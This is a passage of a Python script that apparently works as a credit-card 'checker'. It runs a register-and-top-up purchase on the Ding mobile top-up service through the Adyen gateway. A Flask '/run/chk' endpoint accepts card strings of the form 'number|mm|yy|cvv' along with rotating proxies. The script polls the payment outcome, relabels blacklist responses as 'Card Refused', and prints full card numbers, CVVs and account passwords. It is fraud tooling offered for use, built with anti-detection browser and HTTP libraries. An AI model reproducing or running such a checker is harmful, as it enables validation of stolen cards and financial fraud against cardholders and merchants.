            is_final = purchase_data.get("isFinal", False)
            # Only print on state change
            _p_key = f"{p_status}:{p_reason}"
            if _p_key != _last_p_status:
                _last_p_status = _p_key
                _p_reason_clean = "Card Refused" if "blacklist" in (p_reason or "").lower() else p_reason
                print(f"    - Ding: {p_status or 'Processing'}{f' ({_p_reason_clean})' if _p_reason_clean else ''}")
            # Break only on terminal final states or explicit failures, not just any non-NotStarted
            if is_final:
                break
            low = p_status.lower() if p_status else ""
            if low in ("completed", "success", "delivered", "failed", "error", "paymentfailed", "declined", "refused", "cancelled"):
                break
            # if still NotStarted/Processing/Pending keep polling
        except Exception as e:
            print(f"    - Poll error: {e}")
            if poll_i >= 6:
                break
            time.sleep(2)
            continue

    # ── STEP 14: Classify & print final result ───────────────────────────
    result = classify_payment(resp_text, card_resp_status, poll_data, purchase_data)

    gw_status = poll_data.get("status", poll_data.get("paymentState", "N/A"))
    gw_desc = poll_data.get("description", poll_data.get("reason", ""))
    p_status = purchase_data.get("status", "N/A")
    p_reason = purchase_data.get("reason", "")

    print("\n" + "=" * 60)
    print("         PAYMENT RESULT")
    print("=" * 60)
    print(f"  Email            : {email_address}")
    print(f"  Email Password   : {email_password}")
    print(f"  Phone Number     : {phone_number}")
    print(f"  Country          : {topup_country}")
    print(f"  Product          : {product_code}")
    print(f"  Order Ref        : {order_ref}")
    print(f"  Amount           : {payment_currency} {amount}")
    print(f"  Card             : {card['number_visible']} | {card['expiry_month']}/{card['expiry_year']} | CVV: {card['cvv']} ({detect_card_brand(card['number'])})")
    print(f"  ---")
    print(f"  Adyen Gateway    : {gw_status}" + (f" ({gw_desc})" if gw_desc else ""))
    print(f"  Ding Purchase    : {p_status}" + (f" ({p_reason})" if p_reason else ""))
    print(f"  ---")
    print(f"  Result           : {result}")
    print("=" * 60)

    session.close()
    return result


# ─── Flask REST API ──────────────────────────────────────────────────────────

try:
    from flask import Flask, request, jsonify
    import io as _io
    from contextlib import redirect_stdout
    HAS_FLASK = True
except ImportError:
    HAS_FLASK = False
    Flask = None  # type: ignore

app = Flask(__name__) if HAS_FLASK else None


def _parse_proxy_param(proxy_str: str | None) -> dict | None:
    """Convert a proxy URL string from the API into the {http, https} dict
    expected by requests / curl_cffi. Accepts forms like:
        http://user:pass@host:port
        http://host:port
        socks5://user:pass@host:port
        user:pass@host:port   (assumed http)
    Returns None if input is empty.
    """
    if not proxy_str:
        return None
    proxy_str = proxy_str.strip()
    if not proxy_str:
        return None
    if "://" not in proxy_str:
        proxy_str = "http://" + proxy_str
    return {"http": proxy_str, "https": proxy_str}


@app.route("/healthz", methods=["GET"])
def healthz():
    """Liveness probe."""
    return jsonify({
        "status": "ok",
        "service": "ding-api",
        "time": int(time.time()),
        "curl_cffi": HAS_CURL_CFFI,
        "camoufox": HAS_CAMOUFOX,
    }), 200


@app.route("/run/chk", methods=["GET", "POST"])
def run_chk():
    """Run the Ding register + topup flow.

    Accepted params (query string for GET, form/json for POST):
        cc      (required) — card string `number|mm|yy|cvv`
        proxy   (optional) — proxy URL, e.g. http://user:pass@host:port
        phone   (optional) — phone number with country code (default: 923001234567)
        product (optional) — force a specific Ding product code
    """
    if not HAS_FLASK:
        return "Flask not installed", 500

    cc_input = (request.values.get("cc") or "").strip()
    proxy_str = (request.values.get("proxy") or "").strip()
    phone = (request.values.get("phone") or "").strip()
    product = (request.values.get("product") or "").strip() or None

    if not cc_input:
        return jsonify({
            "ok": False,
            "error": "Missing required param 'cc' (card string: number|month|year|cvv)",
        }), 400

    proxy = _parse_proxy_param(proxy_str)
    custom_phone = phone or "923001234567"

    log_buf = _io.StringIO()
    result = None
    err = None
    try:
        with redirect_stdout(log_buf):
            result = register_and_topup(
                custom_cc=cc_input,
                custom_phone=custom_phone,
                forced_product=product,
                proxy=proxy,
            )
    except Exception as e:
        err = f"{type(e).__name__}: {e}"

    return jsonify({
        "ok": err is None,
        "result": result,
        "error": err,
        "proxy_used": bool(proxy),
        "log": log_buf.getvalue(),
    }), 200 if err is None else 500


# ─── Entry point ─────────────────────────────────────────────────────────────

if __name__ == "__main__":
    if len(sys.argv) > 1:
        # CLI mode — preserve original behavior
        args = parse_cli_args()
        register_and_topup(
            custom_cc=args.card,
            custom_phone=args.phone,
            forced_product=args.product,
        )
    elif HAS_FLASK:
        # Server mode — start Flask on 0.0.0.0:8080
        print("=" * 60)
        print("  Ding Flask API")
        print("  Routes:")
        print("    GET  /healthz              — liveness probe")
        print("    GET  /run/chk?cc=&proxy=    — run Ding flow")
        print("  Listening on http://0.0.0.0:8080")
        print("=" * 60)
        app.run(host="0.0.0.0", port=8080, debug=False)
    else:
        print("Flask is not installed. Install with:  pip install flask")
        print("Then re-run without CLI args to start the server.")
        sys.exit(1)
